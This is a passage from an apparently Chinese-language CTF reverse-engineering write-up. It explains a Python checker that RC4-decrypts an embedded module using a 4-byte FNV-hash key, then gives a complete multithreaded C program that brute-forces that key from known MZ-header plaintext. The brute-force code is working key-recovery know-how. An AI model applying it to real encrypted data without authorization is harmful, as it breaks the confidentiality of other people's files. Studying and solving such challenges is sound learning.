<span class="built_in">open</span>(pyd_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(data_buffer.raw[:<span class="built_in">len</span>(data)])</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    spec = importlib.util.spec_from_file_location(<span class="string">&#x27;checkinput&#x27;</span>, pyd_path)</span><br><span class="line">    module = importlib.util.module_from_spec(spec)</span><br><span class="line">    spec.loader.exec_module(module)</span><br><span class="line">    flag = <span class="built_in">input</span>(<span class="string">&#x27;Input your flag: &#x27;</span>)</span><br><span class="line">    result = module.check(flag.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> result:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Right!&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Wrong!&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Wrong key!&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>关于key的运算，可以看到魔数2166136261与16777619，可以判断是FNV哈希算法，然后哈希值被打包成4字节的小端字节序格式（<code>key_bytes</code>），用作RC4解密的密钥。将解密后的数据放入当前目录下的<code>checkinput.pyd</code>文件中，使用<code>importlib</code>动态导入该模块，并获取其中的<code>check</code>函数。用户被提示输入flag，并调用<code>module.check</code>进行验证。</p>
<p>所以接下来需要求得RC4的密钥</p>
<p>已知:</p>
<ul>
<li>密文前四个字节：<code>\xb7\xc3\xbc\xe5</code>   明文前四个：<code>4D 5A 90 00</code></li>
<li>密钥长度为 4 字节</li>
</ul>
<p>rc4短密钥爆破脚本：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    MistHill, created on 10:24:34 2013-7-3</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    compile:</span></span><br><span class="line"><span class="comment">        Visual Studio 6:</span></span><br><span class="line"><span class="comment">            CL /Og /Os /Oy /Ob1 /GT /Gs /Gf /Gy /G6 /MT rc4KStream75MT.c /link /RELEASE</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Refs:</span></span><br><span class="line"><span class="comment">    1) Optimizing C++/Code optimization/Faster operations</span></span><br><span class="line"><span class="comment">        http://en.wikibooks.org/wiki/Optimizing_C%2B%2B/Code_optimization/Faster_operations</span></span><br><span class="line"><span class="comment">    2) Writing Efficient C and C Code Optimization</span></span><br><span class="line"><span class="comment">        http://www.codeproject.com/Articles/6154/Writing-Efficient-C-and-C-Code-Optimization</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    3) Multithreading Tutorial #1</span></span><br><span class="line"><span class="comment">        http://www.computersciencelab.com/MultithreadingTut1.htm</span></span><br><span class="line"><span class="comment">    4) Walkthrough: Debugging a Multithreaded Application</span></span><br><span class="line"><span class="comment">        http://msdn.microsoft.com/en-us/library/bb157784(v=vs.90).aspx</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TARGETKS1 0xe52c99fa</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">prepare_key</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *key_data_ptr, <span class="type">int</span> key_data_len, <span class="type">unsigned</span> <span class="type">char</span> *state)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">GetKeyStream</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *buffer_ptr, <span class="type">int</span> buffer_len, <span class="type">unsigned</span> <span class="type">char</span> *state)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> _Recursion(<span class="type">void</span>*);</span><br><span class="line"><span class="type">unsigned</span> __stdcall _RecursionT1(<span class="type">void</span>*);</span><br><span class="line"><span class="type">unsigned</span> __stdcall _RecursionT2(<span class="type">void</span>*);</span><br><span class="line"><span class="type">unsigned</span> __stdcall _RecursionT3(<span class="type">void</span>*);</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Recursion</span><span class="params">(<span class="type">int</span> idx, <span class="type">unsigned</span> <span class="type">char</span> *pKey, <span class="type">unsigned</span> <span class="type">char</span> *pKeyStream, <span class="type">unsigned</span> <span class="type">char</span> *pstate)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">ConsoleHandler</span><span class="params">(DWORD dwCtrlType)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ShowExecutionTime</span><span class="params">(BOOL bBreaked)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ShowMatchedKeystream</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>*)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//static int TargetKS1 = 0x62383550, TargetKS2 = 0x6F0C1E2C; /* Target KS = 50 35 38 62 2C 1E 0C 6F */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KeyLength 4</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> szErrMsgCT[] =<span class="string">&quot;Create thread%d failed!\n&quot;</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> szFmtHex2[] =<span class="string">&quot;%02X &quot;</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> szFmtDate[] =<span class="string">&quot;\n%s\t%04d-%02d-%02d %02d:%02d:%02d.%03d&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">char</span> stateinit[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">char</span> Key[<span class="number">8</span>], KeyT1[<span class="number">8</span>], KeyT2[<span class="number">8</span>], KeyT3[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Size: just 4 is fine. Exec. time of function GetKeyStream() reduced!</span></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">char</span> KeyStream[<span class="number">4</span>], KeyStreamT1[<span class="number">4</span>], KeyStreamT2[<span class="number">4</span>], KeyStreamT3[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">char</span> state[<span class="number">256</span>], stateT1[<span class="number">256</span>], stateT2[<span class="number">256</span>], stateT3[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> SYSTEMTIME lt0, lt1;</span><br><span class="line"><span class="type">static</span> DWORD dw0, dw1;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    HANDLE hThread[<span class="number">3</span>];</span><br><span class="line">    <span class="type">unsigned</span> threadID[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">SetConsoleCtrlHandler</span>( (PHANDLER_ROUTINE)ConsoleHandler, TRUE)==FALSE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Unable to install handler!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">GetLocalTime</span>(&amp;lt0);</span><br><span class="line">    dw0 = <span class="built_in">GetTickCount</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i =<span class="number">0</span>; i &lt;<span class="number">256</span>; i++)</span><br><span class="line">        stateinit[i] = i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create the threads.</span></span><br><span class="line">    hThread[<span class="number">0</span>] = (HANDLE)_beginthreadex(<span class="literal">NULL</span>,<span class="number">0</span>, &amp;_RecursionT1,<span class="literal">NULL</span>,<span class="number">0</span>, &amp;threadID[<span class="number">0</span>] );</span><br><span class="line">    <span class="keyword">if</span>(!hThread[<span class="number">0</span>]) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(szErrMsgCT,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    hThread[<span class="number">1</span>] = (HANDLE)_beginthreadex(<span class="literal">NULL</span>,<span class="number">0</span>, &amp;_RecursionT2,<span class="literal">NULL</span>,<span class="number">0</span>, &amp;threadID[<span class="number">1</span>] );</span><br><span class="line">    <span class="keyword">if</span>(!hThread[<span class="number">1</span>]) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(szErrMsgCT,<span class="number">2</span>);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hThread[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    hThread[<span class="number">2</span>] = (HANDLE)_beginthreadex(<span class="literal">NULL</span>,<span class="number">0</span>, &amp;_RecursionT3,<span class="literal">NULL</span>,<span class="number">0</span>, &amp;threadID[<span class="number">2</span>] );</span><br><span class="line">    <span class="keyword">if</span>(!hThread[<span class="number">2</span>]) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(szErrMsgCT,<span class="number">3</span>);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hThread[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hThread[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    _Recursion(<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">WaitForMultipleObjects</span>(<span class="number">3</span>, hThread, TRUE, INFINITE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ShowExecutionTime</span>(FALSE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> _Recursion(<span class="type">void</span>* pArguments)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 0x30~0x7A: T0(0x30~0x42), T1(0x43~0x55), T2(0x56~0x68), T3(0x69~0x7A)</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">64</span>;i++) &#123;</span><br><span class="line">        Key[<span class="number">0</span>] = i;</span><br><span class="line">        <span class="built_in">Recursion</span>(<span class="number">1</span>, Key, KeyStream, state);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __stdcall _RecursionT1(<span class="type">void</span>* pArguments)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">64</span>;i&lt;<span class="number">128</span>;i++) &#123;</span><br><span class="line">        KeyT1[<span class="number">0</span>] = i;</span><br><span class="line">        <span class="built_in">Recursion</span>(<span class="number">1</span>, KeyT1, KeyStreamT1, stateT1);</span><br><span class="line">    &#125;</span><br><span class="line">    _endthreadex(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __stdcall _RecursionT2(<span class="type">void</span>* pArguments)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">128</span>;i&lt;<span class="number">192</span>;i++) &#123;</span><br><span class="line">        KeyT2[<span class="number">0</span>] = i;</span><br><span class="line">        <span class="built_in">Recursion</span>(<span class="number">1</span>, KeyT2, KeyStreamT2, stateT2);</span><br><span class="line">    &#125;</span><br><span class="line">    _endthreadex(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __stdcall _RecursionT3(<span class="type">void</span>* pArguments)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">192</span>;i&lt;<span class="number">256</span>;i++) &#123;</span><br><span class="line">        KeyT3[<span class="number">0</span>] = i;</span><br><span class="line">        <span class="built_in">Recursion</span>(<span class="number">1</span>, KeyT3, KeyStreamT3, stateT3);</span><br><span class="line">    &#125;</span><br><span class="line">    _endthreadex(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Recursion</span><span class="params">(<span class="type">int</span> idx, <span class="type">unsigned</span> <span class="type">char</span> *pKey, <span class="type">unsigned</span> <span class="type">char</span> *pKeyStream, <span class="type">unsigned</span> <span class="type">char</span> *pstate)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++) &#123;</span><br><span class="line">        pKey[idx] = i;</span><br><span class="line">        <span class="keyword">if</span>(idx <span class="number">+1</span> &lt; KeyLength)</span><br><span class="line">            <span class="built_in">Recursion</span>(idx <span class="number">+1</span>, pKey, pKeyStream, pstate);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">memcpy</span>(pstate, stateinit,<span class="built_in">sizeof</span>(stateinit));</span><br><span class="line">            <span class="built_in">prepare_key</span>(pKey, KeyLength, pstate);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>( <span class="built_in">GetKeyStream</span>(pKeyStream,<span class="built_in">sizeof</span>(KeyStream), pstate) )</span><br><span class="line">                <span class="built_in">ShowMatchedKeystream</span>(pKey);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">prepare_key</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *key_data_ptr, <span class="type">int</span> key_data_len, <span class="type">unsigned</span> <span class="type">char</span> *state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> swapByte;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> index1, index2;</span><br><span class="line">    <span class="type">int</span> counter;</span><br><span class="line"></span><br><span class="line">    index1 = index2 =<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(counter =<span class="number">0</span>; counter &lt;<span class="number">256</span>; counter++)</span><br><span class="line">    &#123;</span><br><span class="line">        index2 = key_data_ptr[index1] + state[counter] + index2;</span><br><span class="line"></span><br><span class="line">        swapByte = state[counter];</span><br><span class="line">        state[counter] = state[index2];</span><br><span class="line">        state[index2] = swapByte;</span><br><span class="line"></span><br><span class="line">        index1++;</span><br><span class="line">        <span class="keyword">while</span>(index1 == key_data_len)</span><br><span class="line">            index1 -= key_data_len;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">GetKeyStream</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *buffer_ptr, <span class="type">int</span> buffer_len, <span class="type">unsigned</span> <span class="type">char</span> *state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> swapByte;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> x;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> y;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> xorIndex;</span><br><span class="line">    <span class="type">int</span> counter;</span><br><span class="line"></span><br><span class="line">    x = y =<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(counter =<span class="number">0</span>; counter &lt; buffer_len; counter ++)</span><br><span class="line">    &#123;</span><br><span class="line">        x++;</span><br><span class="line">        y = state[x] + y;</span><br><span class="line"></span><br><span class="line">        swapByte = state[x];</span><br><span class="line">        state[x] = state[y];</span><br><span class="line">        state[y] = swapByte;</span><br><span class="line"></span><br><span class="line">        xorIndex = state[x] + state[y];</span><br><span class="line"></span><br><span class="line">        buffer_ptr[counter] = state[xorIndex];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( *(<span class="type">int</span>*)buffer_ptr == TARGETKS1 )</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">ConsoleHandler</span><span class="params">(DWORD dwCtrlType)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(dwCtrlType == CTRL_C_EVENT) &#123;</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\r&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;KeyLength;i++)</span><br><span class="line">            <span class="built_in">printf</span>(szFmtHex2, Key[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;KeyLength;i++)</span><br><span class="line">            <span class="built_in">printf</span>(szFmtHex2, KeyT1[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;KeyLength;i++)</span><br><span class="line">            <span class="built_in">printf</span>(szFmtHex2, KeyT2[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;KeyLength;i++)</span><br><span class="line">            <span class="built_in">printf</span>(szFmtHex2, KeyT3[i]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(dwCtrlType == CTRL_BREAK_EVENT)</span><br><span class="line">        <span class="built_in">ShowExecutionTime</span>(TRUE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ShowExecutionTime</span><span class="params">(BOOL bBreaked)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">GetLocalTime</span>(&amp;lt1);</span><br><span class="line">    dw1 = <span class="built_in">GetTickCount</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(bBreaked) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nCurrent Keys:\n\t&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;KeyLength;i++)</span><br><span class="line">            <span class="built_in">printf</span>(szFmtHex2, Key[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n\t&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;KeyLength;i++)</span><br><span class="line">            <span class="built_in">printf</span>(szFmtHex2, KeyT1[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n\t&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;KeyLength;i++)</span><br><span class="line">            <span class="built_in">printf</span>(szFmtHex2, KeyT2[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n\t&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;KeyLength;i++)</span><br><span class="line">            <span class="built_in">printf</span>(szFmtHex2, KeyT3[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(szFmtDate,<span class="string">&quot;Start:&quot;</span>, lt<span class="number">0.</span>wYear, lt<span class="number">0.</span>wMonth, lt<span class="number">0.</span>wDay, lt<span class="number">0.</span>wHour, lt<span class="number">0.</span>wMinute, lt<span class="number">0.</span>wSecond, lt<span class="number">0.</span>wMilliseconds);</span><br><span class="line">    <span class="built_in">printf</span>(szFmtDate,<span class="string">&quot;End:&quot;</span>, lt<span class="number">1.</span>wYear, lt<span class="number">1.</span>wMonth, lt<span class="number">1.</span>wDay, lt<span class="number">1.</span>wHour, lt<span class="number">1.</span>wMinute, lt<span class="number">1.</span>wSecond, lt<span class="number">1.</span>wMilliseconds);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\nExecution time:\t%d.%d seconds.\n&quot;</span>, (dw1 - dw0)/<span class="number">1000</span>, (dw1 - dw0)%<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ShowMatchedKeystream</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *pKey)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\tFound:\t&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;KeyLength;j++)</span><br><span class="line">        <span class="built_in">printf</span>(szFmtHex2, pKey[j]);</span><br><span class="line"></span><br><span class="line">    dw1 = <span class="built_in">GetTickCount</span>();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\t%d.%d sec.\n&quot;</span>, (dw1 - dw0)/<span class="number">1000</span>, (dw1 - dw0)%<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

